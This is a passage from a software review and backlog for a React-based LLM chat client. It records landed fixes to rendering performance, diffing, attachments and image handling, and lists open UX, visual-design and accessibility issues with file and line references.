  - `setModels(prev => new Map(prev).set(...))` (lines 156, 171) fires even when the cache is unchanged.
  - Since §1 landed, ChatView re-renders no longer reach finished messages, with one exception: `components/chat/ToolResultView.tsx` calls `useApp()` for API-definition icons, so every minion result in the chat still re-renders on any AppContext change. The context split fixes that too.
- [x] **Two Sidebars are always mounted.** `App.tsx:101, 120`: desktop and mobile are only hidden with CSS. Each one fires its own `HEAD /dev/` (`Sidebar.tsx:32`) and runs its own `RunningLoopsSection`, and each `ActiveLoopRow` ticks a 1 s interval. Collapsing and expanding remounts it and refetches. Render only the one that matches `useIsMobile()`, or mount the drawer's contents only while it's open.
- [x] **Running-loops section churn.** `client/ActiveLoopsStore.ts:160+`: `chat_title_changed` and no-op `updated` events republish a new `loops` array. `RunningLoopsSection.tsx:91-106` (`useChatNamesForLoops`) then re-fetches `getChat` for every unresolved id, including minion ids that already carry a `displayName`. Only republish on real changes, skip loops that have a `displayName`, and remember the ids already attempted.
- [x] **Keyboard Enter on STOP navigates [V].** `components/activeLoops/ActiveLoopRow.tsx:70`: the row's `onKeyDown` also handles Enter bubbling up from the nested STOP button, so it navigates with no abort. Add `if (e.target !== e.currentTarget) return;`, or better, don't nest a button inside `role="button"`.
- [x] `hooks/useConnectionState.ts:10-17`: the state is read at render and the subscription happens in an effect, so a change in between is missed. Use `useSyncExternalStore`.
- [x] `contexts/AppContext.tsx:395-429`: `initializeApp` has no `catch`, so a failed `init` (bad CEK, server down) leaves a blank app with only the red error button. In the export helper, `URL.revokeObjectURL` (line 200) runs right after `click()`, which can cancel large downloads on Safari/Firefox. Defer it.
- [x] Context values are inline objects: `contexts/ErrorProvider.tsx:118`, and the `AlertProvider` provider value. Wrap them in `useMemo`.
- [x] The `[iOS-diag]` pointerdown and per-frame `[kbd]` debug logs are still active.
- [x] **highlight.js bundle.** `lib/markdownRenderer.ts` imports the full `highlight.js` build (192 grammars) so every labeled fence highlights. Auto-detection already uses a 16-language subset (§1). Switching to `highlight.js/lib/core` plus a curated `registerLanguage` list would shrink the bundle a lot, at the cost of rare labels rendering unhighlighted; measure the bundle before and after.

**Projects and settings**

- [x] **Chat rows re-render on every keystroke [V].** `hooks/useProject.ts:93-201`: `createNewChat` / `deleteChat` / `updateProject` / `deleteProject` are new functions on every render, which defeats `React.memo` on `ChatListItem` (`ProjectView.tsx:21`, `handleDeleteChat` at line 203). 5 keystrokes with 50 chats caused 250 row renders. Use `useCallback` with a project ref.
- [x] `ProjectSettingsView` loads the full chat list through `useProject` (`useProject.ts:66`, `getChats`) and never uses it. Split out a project-only loader.
- [x] `components/project/ProjectView.tsx:221-223` calls `navigate()` during render (React warns; under StrictMode it pushes two history entries). Navigate in the click handler instead.
- [x] **Tool number options [V].** `components/project/ProjectSettingsView.tsx:1162`: `onChange` drops NaN, so clearing the field snaps back to the value; backspace-then-type gives `58`; `max` isn't enforced (typing `99` with `max=10` is accepted). Keep the raw string, and parse and clamp on blur or save. `DeleteOlderThanModal.tsx:72,112` has the same backspace problem.
- [x] `components/chat/chatSettings/PromptFileList.tsx:31-41`: `cancelled` is declared inside the `setTimeout` callback, and the cleanup that sets it is returned from that callback, so it never runs. Out-of-order `exists()` batches can leave a badge stuck on `·`.
- [x] Export and Compact modals can't actually cancel: `abortedRef` is never set, and the backdrop closes the modal while it runs. The download still pops up later.
- [x] Form state sprawl:
  - `SettingsPage` duplicates the add and edit API-definition forms (28 `useState` fields, reset in three places), and they've drifted: the add form's Advanced section lacks "Subscription service" and "Enforce genuine Anthropic".
  - `ProjectSettingsView` has 40+ `useState` and a `handleSave` `useCallback` with 34 deps, which rebuilds on every keystroke and memoizes nothing.
  - Use one `useReducer` form object and a shared API-definition form component.

**File manager (VFS), data and attachments**

- [x] **Diffs on large files [V].** `lib/lcsDiff.ts:25` builds a full O(m·n) table of JS arrays with no common prefix/suffix trimming. It runs synchronously in `useMemo` (`VfsDiffViewer.tsx:180`). Measured for a one-line edit: 5k lines took 484 ms / ~200 MB, and 12k lines took 2.3 s / 642 MB. Trim the common prefix and suffix first (that makes typical edits trivial), then use Myers or a `Uint32Array` table, with a line cap and a fallback.
- [x] `components/project/VfsDiffViewer.tsx:389,400`: the gutter number is the diff-array index, not a file line number, so it matches neither version. Track separate old and new counters.
- [x] **Attachment manager observers churn [V].** `hooks/useAttachmentManager.ts:69-112` + `components/AttachmentManagerView.tsx:171`: an inline `onVisibilityChange` and `loadSectionData` (which depends on `loadedData`) recreate every section's IntersectionObserver on every render, and sections still loading fetch again. Simulated: 72 `getAttachments` calls instead of 18, and 120 observers for 6 sections. A section that is unloaded mid-fetch still gets data set afterwards. Use a stable callback, refs for in-flight and wanted sections, and drop results for unloaded sections.
- [x] **GIF/WebP bytes mislabeled.** `lib/imageProcessor.ts:125, 149-188`: only JPEG and PNG bypass the canvas. GIFs are re-encoded through `toDataURL('image/gif')`, which browsers can't encode, so it returns PNG bytes labeled `image/gif`. WebP has the same problem on Safari, and animated GIFs lose their animation. Providers that validate the media type reject them. Read the real MIME type from the returned `data:` prefix, or pass small GIF/WebP files through untouched.
- [x] **Export progress per row.** `src/shared/engine/exportRunner.ts:38` emits a `progress` event for every row; each one crosses the boundary and re-renders `DataManagerPage` (line 94). Throttle it to every N rows or ~100 ms, as import already does.
- [x] `components/AdminRecordEditorModal.tsx:56` runs `JSON.parse` on every render/keystroke, which is painful on multi-MB rows. Use `useDeferredValue` or a debounce.
- [x] `lib/stackTraceMapper.ts:13-16`: the comment says "Use sourceCache" but no `sourceCache` is passed, so every error re-fetches and re-parses the source maps. Pass a module-level cache.
- [x] `components/project/VfsManagerView.tsx:80`: the deep-link effect depends on `isMobile`, so crossing 768 px (tablet rotation) snaps the selection back to `initialPath` and reopens the mobile modal.

**Landed.** Notes by area, and where the fix differs from the direction above:

- **App shell and global state:**
  - **Context split:** six contexts behind narrow hooks (`useAppActions`, `useApiDefinitions`, `useProjects`, `useModels`, `useAppStatus`); the everything-hook `useApp()` survives only in DataManagerPage and WelcomeScreen. `AppContent` doesn't call `useNavigate` either (it subscribes to the location under `HashRouter`), so navigation doesn't re-render the shell.
  - **One Sidebar:** `useIsMobile()` picks it, and the hook changed along the way: it now reads `matchMedia('(width < 48rem)')`, the exact complement of Tailwind's `md`, instead of a 768 px check, so JS gating and `md:` classes flip at the same width under any browser font size or zoom. The drawer's Sidebar unmounts after its slide-out (1 s backstop if `transitionend` never fires), and it opens with a notch spacer, so its header no longer sits under the iPhone status bar (the collapsed desktop rail pads for it too). Because no Sidebar may be mounted, `AppContent` starts `activeLoopsStore` itself once init succeeds; `useChat`'s soft-stop seed reads that store.
  - **Running loops:** titles live in `ActiveLoopsStore`, not a hook. A chat's title state is forgotten once it has no running loop, so a rename between runs shows up on the next run.
  - **Init failure:** a "Couldn't start" screen with Reload, plus "Open Data Manager" in server mode only, the one mode where Disconnect Backend works without a backend. The first project load is awaited too, so its failure lands on that screen.
  - **Debug logs:** the `[iOS-diag]` / `[tap]` and `[sidebar]` probes are gone, and so is the unused `useIsKeyboardVisible` hook with its `[kbd]` log.
  - **highlight.js:** `lib/core` + 41 grammars, including `shell` (Shell Session) so `shell` / `console` fences keep highlighting. Main chunk 2,006 → 1,214 kB (609 → 356 kB gzip).
- **Projects and settings:**
  - **Stable callbacks:** `useStableCallback` rather than `useCallback` + refs. `deleteProject` returns its promise, so settings navigates only after the delete, and callers now patch only the fields they edit (see §3).
  - **Numbers:** `NumberInput` commits clamped values while typing and clamps or reverts the draft on blur, rather than parsing only on blur or save, so derived values (the delete preview count) always match what the action does.
  - **Export cancels, compact blocks closing:** export takes an `AbortSignal` and cancels the stream. Compact can't stop server-side, so its modal ignores every close path while it runs. That "busy modal" rule now also covers DeleteOlderThanModal, SystemPromptModal, ProjectNameIconModal, CloneMinionChatModal and ChatView's rename modal.
  - **Form state:** one `ApiDefinitionForm` (a reducer) for add and edit. The type-specific advanced fields come from a single rule, and a save scrubs every value the type doesn't show. ProjectSettingsView keeps one reducer form and saves a patch of only the fields it edits. §8's unsaved-changes guard is not built yet.
- **File manager (VFS), data and attachments:**
  - **lcsDiff:** prefix/suffix trim, a flat `Uint32Array` table up to 4M cells, then a Myers pass capped at 2000 edits, and only then the block-replacement fallback. Edits at both ends of a big file still get a minimal diff.
  - **Attachment manager:** refs for wanted / in-flight / loaded sections, memoized sections, and the scroller as observer root (the 200% margin used to be measured against the viewport). 18 fetches instead of 72.
  - **imageProcessor:** every supported type under 500 KB passes through untouched; re-encodes take their MIME type from the returned data URL, falling back to PNG.
  - **AdminRecordEditorModal:** it defers `{ isOpen, record, json }` together, not just the JSON, so a freshly loaded record is never validated against the previous record's text.
  - **stackTraceMapper:** module-level caches, plus eviction of cached failed fetches so an offline blip doesn't stick for the session.
  - **VfsManagerView:** besides the deep-link effect, a selection counter now guards the desktop Edit load, and `VfsFileModal` got the same guard. That closes §3's "Opening the editor races file selection". App keys the route by project and path, so switching projects on the same deep link remounts the view instead of handing the old selection or open editor to the new adapter (`App.test.tsx`).

---

## 8. Backlog: app-wide UX and visual design

**Visual system**

- [ ] There is no dark mode: zero `dark:` classes, next to an already-dark sidebar. Decide on a token approach first (CSS variables in `index.css` + Tailwind theme), then migrate page by page.
- [ ] **Accent palette.** Eight accent hues each have their own meaning: blue (user), purple (backstage), pink (minion), amber (pending), yellow (locked), green (DUMMY), red (error), orange (rollback). Collapse them to neutral / accent / warning / danger, and let icons carry the kind.
- [ ] **Icons.** Emoji are the whole icon set; they render differently per OS and weigh inconsistently. Consider a small SVG icon set for the chrome (menu, close, send, attach, copy, settings), and keep emoji for user content and tool icons.
- [ ] **Type scale.** 10 px info bars (9 occurrences) and 9–10 px loop rows are below comfortable reading size. Make 12 px the floor.
- [ ] No `prefers-reduced-motion` handling for the custom animations in `index.css`.

**Accessibility (beyond section 6)**

- [ ] Icon-only emoji buttons have a `title` but no `aria-label` (ProjectView, ProjectSettingsView and SettingsPage have none).
- [ ] The Message Format and Timestamp radios lack `name`, so arrow keys don't group them.
- [ ] OOBE inputs use `<label>` without `htmlFor`, and the `sr-only` radio cards show no focus ring.
- [ ] The Record Editor uses `text-xs`/`text-sm` inputs, which makes iOS zoom on focus.
- [ ] The CEK is shown in plain text on the Data page: add a reveal toggle, and `autoComplete="off"` on CEK inputs.

**Navigation and sidebar**

- [ ] On mobile the drawer stays open after creating a project. The new-project input has no `autoFocus`, and Enter can double-submit while the save is in flight. (The Enter double-submit landed with §7; the other two remain.)
- [ ] No project is highlighted on `/chat/:id` routes, so you lose track of where you are.
- [ ] `ActiveLoopRow`: elapsed time compares the server's `startedAt` (lines 39-44) with the client clock, so it can go negative in server mode. Clamp it to ≥ 0.

**Model picker and settings pages**

- [ ] **ModelSelector.**
  - It has no search or filter (painful with OpenRouter-sized lists).
  - The provider dropdown is custom and has no arrow-key or Escape support.
  - Prices have no units (per 1M tokens?).
  - "Tap the gear icon" should be a link to `/settings`.
  - "Remove" should read "Use project default".
- [ ] **Unsaved changes.** The guard is inconsistent: ChatSettingsPanel confirms before discarding, while ProjectSettingsView (✕, Cancel, sidebar) and SettingsPage (Edit on another definition) discard silently.
- [ ] **API keys.** A bad API key fails silently: saving blocks on model discovery, and a failure there is only logged (`refreshModels`). There is also no per-provider "Refresh models" button, although the Verbosity hint tells users to refresh.
- [ ] **ChatSettingsPanel.**
  - Overriding "Thinking keep turns" seeds `-1` (all turns) while the inherited label says "model default", which silently changes behavior.
  - "Saved" never clears after later edits.
  - The Model section applies immediately while everything else waits for Save.
  - The `*` override marker is cryptic.
  - Temperature allows 0–2 there, while Project Settings says "(0-1)".
- [ ] ChatGPT sign-in uses the _saved_ definition, so a proxy URL just typed (required in worker mode) is ignored until Save. Save first automatically, or say so in the panel.
- [ ] The Reasoning section shows every provider's subsection regardless of the active provider. Highlight the active one or dim the rest; the budget warning also appears twice.
- [ ] Chat rows are dense: raw `ctx: 123456`, `$0.0000`, a date with no time. Use compact numbers and relative time.
- [ ] `ProjectNameIconModal.tsx:111`: `grid-cols-8` with fixed `h-12 w-12` buttons needs ~440 px and overlaps on a 375 px phone. Use `grid-cols-[repeat(auto-fill,minmax(2.75rem,1fr))]`. The icon `maxLength` is 3 there and 2 elsewhere, and both reject flag/ZWJ emoji.
- [ ] Deleting an API definition doesn't warn about the projects that use it.
- [ ] "Version 1.0.0" is hardcoded.
- [ ] `App.tsx:212`: "persistance" should be "persistence".

**File manager (VFS)**

- [ ] Create, and every error path, use native `prompt()` / `alert()` (`VfsManagerView.tsx:212-233` and onward): the only ones in the app. There's no name validation (`/`, `..`). Delete failures only `console.debug`. Use the alert system plus a small input modal.
- [ ] **The directory tree.**
  - Clicking a directory both selects and toggles it, so selecting an expanded folder (to upload into it) collapses it.
  - The root chevron is a `<span onClick>` inside a `<button>`, which the keyboard can't reach.
  - New File / Upload only exist when a directory is selected.
  - Upload silently overwrites same-named files (they're versioned, but there's no prompt).
- [ ] **Diff labels.** The diff shows "Changes in v5" (v4 → v5), but "Rollback to v5" restores v5's content, keeping those changes. Relabel it ("Restore this version") or add a compare-with-current mode.

**Data, attachments, first run**

- [ ] `AttachmentSection.tsx:90` (sticky `z-10`) slides under the `AttachmentManagerView.tsx:156` stats bar (sticky `z-20`). Offset the section header by the bar's height.
- [ ] **OOBEComplete.**
  - The CEK sits in a `whitespace-nowrap overflow-x-auto` block (line 73), cut off on phones; use `select-all break-all`.
  - It says "imported successfully" for `mode === 'existing'` (a connect, not an import).
  - It shows ✅ even when the import reported errors, which only reach the console.
